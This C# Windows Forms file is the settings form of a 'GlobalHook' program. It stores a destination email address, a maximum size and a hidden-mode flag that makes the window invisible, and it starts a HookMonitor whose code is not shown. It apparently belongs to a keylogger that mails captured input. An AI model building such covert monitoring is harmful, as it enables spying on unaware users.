using System;
using System.Collections.Generic;
using System.ComponentModel;
using System.Data;
using System.Drawing;
using System.Linq;
using System.Text;
using System.Text.RegularExpressions;
using System.Threading.Tasks;
using System.Windows.Forms;

namespace GlobalHook
{
    public partial class HookForm : Form
    {
        private readonly Regex _emailRegex = new Regex("(^[a-zA-Z0-9_.+-]+@[a-zA-Z0-9-]+\\.[a-zA-Z0-9-.]+$)");

        private readonly Regex _intRegex = new Regex("^0*[1-9]\\d*$");
        private readonly HookMonitor _monitor = new HookMonitor();
        private readonly SettingAdapter _settingsAdapter = new SettingAdapter();

        public HookForm()
        {
            InitializeComponent();
            _settingsAdapter.Init();
            emailTextBox.Text = _settingsAdapter.DestinationEmail;
            sizeTextBox.Text = _settingsAdapter.MaxSize.ToString();
            hideCheckBox.Checked = _settingsAdapter.IsHidden;
            _monitor.Init(this, _settingsAdapter);
            if (_settingsAdapter.IsHidden)
                HideApp();
        }

        public void HideApp()
        {
            Opacity = 0.0f;
            ShowInTaskbar = true;
            FormBorderStyle = FormBorderStyle.Sizable;
            Activate();
        }

        public void ShowApp()
        {
            Opacity = 1;
            ShowInTaskbar = true;
            FormBorderStyle = FormBorderStyle.Sizable;
            Activate();
        }

        private void HookForm_Load(object sender, EventArgs e)
        {

        }

        private void SaveButton_Click(object sender, EventArgs e)
        {
            if (_emailRegex.IsMatch(emailTextBox.Text))
                _settingsAdapter.DestinationEmail = emailTextBox.Text;
            else MessageBox.Show(@"Enter correct email");
            if (_intRegex.IsMatch(sizeTextBox.Text))
                _settingsAdapter.MaxSize = Convert.ToInt32(sizeTextBox.Text);
            else MessageBox.Show(@"Enter integer value");
            _settingsAdapter.IsHidden = hideCheckBox.Checked;
            _settingsAdapter.Save();

        }

        private void HideButton_Click(object sender, EventArgs e)
        {
            HideApp();
        }
    }
}
